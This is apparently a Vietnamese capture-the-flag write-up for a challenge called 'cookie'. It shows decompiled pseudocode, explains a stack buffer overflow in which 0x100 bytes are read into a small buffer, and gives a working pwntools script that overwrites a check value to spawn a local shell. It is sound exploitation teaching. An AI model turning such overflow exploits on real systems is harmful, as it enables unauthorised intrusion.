# COOKIE

### Bài này không cho mình hàm main cụ thể, mà chỉ sử dụng hàm _start. Mình có thể dùng IDA để xem.

```sh
int start()
{
  int v0; // eax
  int v1; // eax
  int result; // eax
  _DWORD v3[9]; // [esp-24h] [ebp-24h] BYREF

  v0 = sys_write(1, &hello, 0xEu);
  v1 = sys_read(0, v3, 0x100u);
  if ( v3[8] == 0x414D4B5F )
    result = sys_execve(binsh, 0, 0);
  else
    result = sys_write(1, &bye, 6u);
  return result;
}
```

Mục đích bài này là chúng ta sẽ leo lên shell bằng `sys_execve(bính,0,0)` trong pseudo code ở trên.

Nếu điều kiện không thỏa thì hàm `sys_write(1,&byte, 6u)` sẽ được gọi.

Lỗi Buffer Overflow ở đây khá rõ ràng vì chương trình dùng hàm `sys_read(0, v3, 0x100u)` mà `_DWORD v3[9]; // [esp-24h] [ebp-24h]` bé hơn nhiều so với 0x100

Ta có 
```sh
0x80480ac <_start+44>    int    0x80 <SYS_read>
        fd: 0x0
        buf: 0xffffd520 ◂— 0x0
        nbytes: 0x100

```
Chỉ cần nhập tràn tới biến `v3[8]` và gán `v3[8] = 0x414D4B5F` thì chúng ta sẽ lên được shell.

## File Cookie exploit của mình:
```sh
from pwn import *
s = process("./cookie")
pause()
pl = "aaaaaaabaaacaaadaaaeaaafaaagaaah" + p32(0x414d4b5f)

s.sendline(pl)
s.interactive()

```
